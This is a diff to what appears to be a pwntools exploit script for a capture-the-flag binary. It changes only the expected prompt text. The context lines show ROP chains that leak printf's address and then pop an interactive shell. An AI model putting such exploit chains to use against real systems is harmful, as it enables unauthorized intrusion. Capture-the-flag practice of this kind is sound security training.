@@ -46,7 +46,7 @@ def get_addr_printf(proc):
     rop += p64(addrplt_printf)
     rop += p64(0x0000000000400580) #_start
 
-    proc.recvuntil("[4096 bits] : ")
+    proc.recvuntil("[4096 bytes] : ")
     proc.sendline(rop)
     proc.recvuntil("Have a good day")
     addr_str = proc.recvline().split("Welcome in complaints center.")[0]
@@ -76,7 +76,7 @@ def pop_shell(proc, addr_printf):
     rop += p64(0x0)
     rop += p64(addr_exit)
 
-    proc.recvuntil("[4096 bits] : ")
+    proc.recvuntil("[4096 bytes] : ")
     proc.sendline(rop)
     proc.recvuntil("Have a good day")
     proc.interactive()
